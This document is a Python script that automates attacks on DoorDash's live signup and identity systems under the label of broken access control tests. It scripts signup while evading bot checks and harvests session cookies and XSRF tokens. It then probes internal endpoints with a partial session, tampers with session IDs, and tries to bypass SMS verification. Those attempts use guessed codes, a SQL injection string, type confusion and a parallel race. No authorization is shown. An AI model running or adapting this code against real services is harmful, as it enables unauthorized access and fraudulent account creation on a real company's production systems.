#!/usr/bin/env python3
"""
Broken Access Control tests against DoorDash.
1. Get valid signup session (mobile path, no attestation)
2. Extract session tokens
3. Test access to protected endpoints with partial session
4. Test session swapping / IDOR on signup flow
5. Test verification bypass techniques
"""
import os, sys, json, time, random, re
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright

OUT_DIR = "/tmp/doordash/bac-tests"
os.makedirs(OUT_DIR, exist_ok=True)

SIGNUP_URL = (
    "https://identity.doordash.com/auth/user/signup"
    "?client_id=1666519390426295040"
    "&redirect_uri=https://www.doordash.com/post-login/"
    "&response_type=code&scope=*"
    "&state=bac-test-{ts}&intl=en-US&layout=consumer_web"
).replace("{ts}", str(int(time.time())))

def save(data, name):
    path = f"{OUT_DIR}/{name}"
    with open(path, 'w') as f:
        if isinstance(data, (dict, list)):
            json.dump(data, f, indent=2, default=str)
        else:
            f.write(str(data))
    print(f"  💾 {path}")

# ═══════════════════════════════════════════════════════
# STEP 1: Get a valid signup session
# ═══════════════════════════════════════════════════════
def get_signup_session():
    """Reach SMS verification screen and return session data"""
    email = f"bac{int(time.time())}{random.randint(0,99)}@ex.com"
    phone = f"415555{random.randint(0,9999):04d}"

    print(f"🎯 Getting signup session...")
    print(f"   Email: {email}")
    print(f"   Phone: {phone}\n")

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-setuid-sandbox']
        )
        context = browser.new_context(
            viewport={'width': 390, 'height': 844},
            user_agent='Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15',
            is_mobile=True, has_touch=True, locale='en-US',
        )
        page = context.new_page()

        # CDP for response body capture
        cdp = page.context.new_cdp_session(page)
        cdp.send('Network.enable')
        
        signup_response_body = None
        response_bodies = {}

        def on_response(params):
            nonlocal signup_response_body
            url = params.get('response', {}).get('url', '')
            rid = params.get('requestId', '')
            if 'signup/phone' in url and 'OPTIONS' not in url:
                try:
                    body = cdp.send('Network.getResponseBody', {'requestId': rid})
                    if body.get('body'):
                        signup_response_body = body['body']
                        print(f"   📦 /signup/phone response: {body['body'][:300]}")
                except:
                    pass
            if any(k in url for k in ['signup', 'verify', 'token', 'oauth']):
                try:
                    body = cdp.send('Network.getResponseBody', {'requestId': rid})
                    if body.get('body'):
                        response_bodies[url[:120]] = body['body'][:1000]
                except:
                    pass

        cdp.on('Network.responseReceived', on_response)

        # Navigate and fill form
        print("[1] Loading signup page...")
        page.goto(SIGNUP_URL, wait_until='domcontentloaded', timeout=30000)
        for i in range(15):
            if 'just a moment' not in page.title().lower():
                break
            time.sleep(1)

        page.wait_for_timeout(2000)

        # Fill form
        print("[2] Filling form...")
        for sel, val in [
            ('input[autocomplete="given-name"]', 'Test'),
            ('input[autocomplete="family-name"]', 'User'),
            ('input[type="email"]', email),
            ('input[type="tel"]', phone),
        ]:
            page.evaluate("""({sel, val}) => {
                const el = document.querySelector(sel);
                if (!el) return;
                const s = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set;
                s.call(el, val);
                el.dispatchEvent(new Event('input', {bubbles:true}));
                el.dispatchEvent(new Event('change', {bubbles:true}));
            }""", {'sel': sel, 'val': val})
            time.sleep(0.2)

        page.wait_for_timeout(1000)

        # Click Sign Up
        print("[3] Clicking Sign Up...")
        page.evaluate("""() => {
            for (const b of document.querySelectorAll('button')) {
                if (b.textContent.trim().toLowerCase() === 'sign up') { b.click(); return; }
            }
        }""")
        page.wait_for_timeout(5000)

        # Check if we reached SMS verification
        otp_inputs = page.evaluate("""() => {
            return document.querySelectorAll('input[type="number"], input[maxLength="1"]').length;
        }""")
        reached_verify = otp_inputs > 0
        print(f"   SMS verification screen: {'✅ YES' if reached_verify else '❌ NO'} ({otp_inputs} OTP inputs)")

        # Extract all cookies
        cookies = context.cookies()
        session_id = next((c['value'] for c in cookies if 'identity-session' in c['name']), None)
        xsrf = next((c['value'] for c in cookies if c['name'] == 'XSRF-TOKEN'), '')

        print(f"   session_id: {session_id[:40] if session_id else 'NONE'}")
        print(f"   XSRF: {xsrf[:20]}...")

        # Check current URL
        url = page.url
        print(f"   URL: {url[:120]}")

        # Extract any error/success messages
        msgs = page.evaluate("""() => {
            return Array.from(document.querySelectorAll('[role="alert"], .error, [class*="error"]'))
                .map(e => e.textContent.trim().slice(0, 200));
        }""")
        if msgs:
            print(f"   Messages: {msgs}")

        browser.close()

    return {
        'email': email,
        'phone': phone,
        'session_id': session_id,
        'xsrf_token': xsrf,
        'cookies': cookies,
        'reached_verify': reached_verify,
        'signup_response': signup_response_body,
        'response_bodies': response_bodies,
        'url': url,
        'msgs': msgs,
    }


# ═══════════════════════════════════════════════════════
# STEP 2: Test Protected Endpoints with Session
# ═══════════════════════════════════════════════════════
def test_protected_endpoints(session):
    """Try to access endpoints that should require full auth"""
    import requests
    
    headers = {
        'User-Agent': 'DoorDash/25.0 (iPhone; iOS 18.0)',
        'Content-Type': 'application/json',
    }
    if session['xsrf_token']:
        headers['x-xsrf-token'] = session['xsrf_token']
    
    # Cookie string from session
    cookie_str = '; '.join([
        f"{c['name']}={c['value']}" for c in session['cookies']
        if c['name'] not in ['XSRF-TOKEN']  # handled in header
    ])
    
    print(f"\n{'=' * 60}")
    print("TESTING PROTECTED ENDPOINTS WITH PARTIAL SESSION")
    print(f"{'=' * 60}")

    tests = [
        # BFF endpoints
        ("GET", "https://consumer-mobile-bff.doordash.com/"),
        ("POST", "https://consumer-mobile-bff.doordash.com/graphql",
         '{"query": "query { __typename }"}'),
        
        # Identity endpoints
        ("POST", "https://identity.doordash.com/signup/phone/signup_continue",
         json.dumps({
             "clientId": "1666519390426295040",
             "email": session['email'],
             "phoneNumber": session['phone'],
             "password": "TestPass123!",
             "redirectUri": "https://www.doordash.com/post-login/",
             "scope": "*",
             "responseType": "code",
             "state": "bac-test",
         })),
        
        # Token endpoint
        ("POST", "https://identity.doordash.com/identity-bff/v1/oauth2/token",
         json.dumps({
             "grantType": "client_credentials",
             "clientId": "1666519390426295040",
             "scope": "*",
         })),
        
        # Token identity
        ("POST", "https://identity.doordash.com/identity/v1/token",
         json.dumps({"grantType": "authorization_code", "code": "test"})),
        
        # Session status check
        ("GET", "https://identity.doordash.com/auth/user/signup"),
        
        # Try www.doordash.com API
        ("POST", "https://www.doordash.com/api/graphql",
         '{"query": "query { __typename }"}'),
        
        # Try dasher BFF
        ("GET", "https://dasher-mobile-bff.doordash.com/"),
        
        # Risk endpoints
        ("GET", "https://risk-bff.doordash.com/"),
    ]

    results = []
    for method, url, *body in tests:
        try:
            kwargs = {'headers': headers, 'timeout': 10, 'allow_redirects': False}
            if cookie_str:
                kwargs['headers']['Cookie'] = cookie_str
            if body and body[0]:
                kwargs['data'] = body[0]
            
            if method == 'GET':
                resp = requests.get(url, **kwargs)
            else:
                resp = requests.post(url, **kwargs)
            
            body_preview = resp.text[:200].replace('\n', ' ')
            result = {
                'url': url[:100],
                'method': method,
                'status': resp.status_code,
                'body': body_preview,
                'content_type': resp.headers.get('content-type', '?')[:40],
            }
            results.append(result)
            
            # Highlight interesting responses
            flag = ''
            if resp.status_code == 200 and 'error' not in body_preview.lower():
                flag = ' 🔥 ACCESS GRANTED'
            elif resp.status_code == 401:
                flag = ' (expected: needs auth)'
            elif resp.status_code == 403 and 'cloudflare' in body_preview.lower():
                flag = ' (CF blocked)'
            
            print(f"  [{method}] {url[:70]:70} → {resp.status_code} {flag}")
            if flag:
                print(f"    Body: {body_preview[:150]}")
            
        except Exception as e:
            print(f"  [{method}] {url[:70]:70} → ERR: {str(e)[:60]}")

    save(results, "endpoint-access-results.json")
    return results


# ═══════════════════════════════════════════════════════
# STEP 3: Session Manipulation Tests
# ═══════════════════════════════════════════════════════
def test_session_manipulation(session):
    """Test if we can manipulate session IDs for IDOR"""
    import requests
    
    print(f"\n{'=' * 60}")
    print("SESSION MANIPULATION TESTS")
    print(f"{'=' * 60}")
    
    headers = {
        'User-Agent': 'DoorDash/25.0 (iPhone; iOS 18.0)',
        'Content-Type': 'application/json',
    }
    if session['xsrf_token']:
        headers['x-xsrf-token'] = session['xsrf_token']
    
    # Test 1: Try with NO session
    print("\n[Test 1] No session cookie:")
    try:
        resp = requests.post(
            'https://identity.doordash.com/signup/phone/verify',
            headers=headers,
            json={
                "email": session['email'],
                "otc": "000000",
                "clientId": "1666519390426295040",
                "deviceId": None,
            },
            timeout=10
        )
        print(f"  {resp.status_code} | {resp.text[:200]}")
    except Exception as e:
        print(f"  ERR: {e}")
    
    # Test 2: Try with wrong session ID (swap characters)
    if session['session_id']:
        swapped = session['session_id'][::-1]  # reversed
        print(f"\n[Test 2] Reversed session: {swapped[:20]}...")
        cookie_str = f"dd-identity-session-id={swapped}"
        if session['xsrf_token']:
            cookie_str += f"; XSRF-TOKEN={session['xsrf_token']}"
        try:
            resp = requests.post(
                'https://identity.doordash.com/signup/phone/verify',
                headers={**headers, 'Cookie': cookie_str},
                json={
                    "email": session['email'],
                    "otc": "000000",
                    "clientId": "1666519390426295040",
                    "deviceId": None,
                },
                timeout=10
            )
            print(f"  {resp.status_code} | {resp.text[:200]}")
        except Exception as e:
            print(f"  ERR: {e}")
        
        # Test 3: Try empty session
        print(f"\n[Test 3] Empty session ID:")
        try:
            resp = requests.post(
                'https://identity.doordash.com/signup/phone/verify',
                headers={**headers, 'Cookie': 'dd-identity-session-id='},
                json={
                    "email": session['email'],
                    "otc": "000000",
                    "clientId": "1666519390426295040",
                    "deviceId": None,
                },
                timeout=10
            )
            print(f"  {resp.status_code} | {resp.text[:200]}")
        except Exception as e:
            print(f"  ERR: {e}")
    
    # Test 4: Try calling verify with our own session but different email
    print(f"\n[Test 4] Different email with same session:")
    try:
        cookie_str = f"dd-identity-session-id={session['session_id']}"
        if session['xsrf_token']:
            cookie_str += f"; XSRF-TOKEN={session['xsrf_token']}"
        resp = requests.post(
            'https://identity.doordash.com/signup/phone/verify',
            headers={**headers, 'Cookie': cookie_str},
            json={
                "email": "completely@different.email",
                "otc": "000000",
                "clientId": "1666519390426295040",
                "deviceId": None,
            },
            timeout=10
        )
        print(f"  {resp.status_code} | {resp.text[:200]}")
    except Exception as e:
        print(f"  ERR: {e}")


# ═══════════════════════════════════════════════════════
# STEP 4: Verification Bypass Tests
# ═══════════════════════════════════════════════════════
def test_verification_bypass(session):
    """Test if we can bypass SMS verification"""
    import requests
    
    print(f"\n{'=' * 60}")
    print("VERIFICATION BYPASS TESTS")
    print(f"{'=' * 60}")
    
    headers = {
        'User-Agent': 'DoorDash/25.0 (iPhone; iOS 18.0)',
        'Content-Type': 'application/json',
    }
    cookie_str = f"dd-identity-session-id={session['session_id']}"
    if session['xsrf_token']:
        headers['x-xsrf-token'] = session['xsrf_token']
        cookie_str += f"; XSRF-TOKEN={session['xsrf_token']}"
    headers['Cookie'] = cookie_str
    
    # Test A: Try to continue signup without verification
    print("\n[Test A] signup_continue without verification:")
    try:
        resp = requests.post(
            'https://identity.doordash.com/signup/phone/signup_continue',
            headers=headers,
            json={
                "clientId": "1666519390426295040",
                "countryCode": "US",
                "email": session['email'],
                "firstName": "Test",
                "lastName": "User",
                "password": "TestPass123!",
                "phoneNumber": session['phone'],
                "redirectUri": "https://www.doordash.com/post-login/",
                "responseType": "code",
                "scope": "*",
                "state": "bac-test",
                "disableSeamlessChannel": False,
                "layout": "consumer_web",
            },
            timeout=10
        )
        print(f"  {resp.status_code} | {resp.text[:250]}")
    except Exception as e:
        print(f"  ERR: {e}")
    
    # Test B: Try different OTC values to see response patterns
    print("\n[Test B] OTC response pattern testing:")
    test_codes = ['000000', '123456', '999999', '', 'abcdef', "'; DROP TABLE--"]
    for code in test_codes:
        try:
            resp = requests.post(
                'https://identity.doordash.com/signup/phone/verify',
                headers=headers,
                json={
                    "email": session['email'],
                    "otc": code,
                    "clientId": "1666519390426295040",
                    "deviceId": None,
                },
                timeout=10
            )
            body = resp.text[:150]
            print(f"  otc='{code:20}' → {resp.status_code} | {body}")
        except Exception as e:
            print(f"  otc='{code:20}' → ERR: {e}")
    
    # Test C: Try OTC as JSON object (type confusion)
    print("\n[Test C] OTC type confusion:")
    for payload in [
        {"otc": 0, "email": session['email'], "clientId": "1666519390426295040", "deviceId": None},
        {"otc": None, "email": session['email'], "clientId": "1666519390426295040", "deviceId": None},
        {"otc": True, "email": session['email'], "clientId": "1666519390426295040", "deviceId": None},
        {"otc": [], "email": session['email'], "clientId": "1666519390426295040", "deviceId": None},
    ]:
        try:
            resp = requests.post(
                'https://identity.doordash.com/signup/phone/verify',
                headers=headers,
                json=payload,
                timeout=10
            )
            print(f"  otc={str(payload['otc']):10} → {resp.status_code} | {resp.text[:150]}")
        except Exception as e:
            print(f"  ERR: {e}")
    
    # Test D: Race condition — multiple simultaneous verify requests
    print("\n[Test D] Race condition (3 parallel verify requests):")
    import concurrent.futures
    def verify_code(code):
        try:
            resp = requests.post(
                'https://identity.doordash.com/signup/phone/verify',
                headers=headers,
                json={
                    "email": session['email'],
                    "otc": code,
                    "clientId": "1666519390426295040",
                    "deviceId": None,
                },
                timeout=10
            )
            return f"otc={code} → {resp.status_code} | {resp.text[:100]}"
        except:
            return f"otc={code} → ERR"
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(verify_code, f"{i:06d}") for i in [111111, 222222, 333333]]
        for f in concurrent.futures.as_completed(futures):
            print(f"  {f.result()}")


# ═══════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════
def main():
    print("🛡️  DOORDASH BROKEN ACCESS CONTROL TESTS\n")
    
    # Step 1: Get session
    session = get_signup_session()
    
    if not session['session_id']:
        print("\n❌ Failed to get session — can't continue")
        return 1
    
    save(session['cookies'], "session-cookies.json")
    save(session['signup_response'], "signup-response.txt")
    save(session['response_bodies'], "response-bodies.json")
    
    # Step 2: Test protected endpoints
    endpoint_results = test_protected_endpoints(session)
    
    # Step 3: Session manipulation
    test_session_manipulation(session)
    
    # Step 4: Verification bypass
    test_verification_bypass(session)
    
    print(f"\n{'=' * 60}")
    print("ALL RESULTS SAVED TO:", OUT_DIR)
    print(f"{'=' * 60}")

if __name__ == '__main__':
    main()
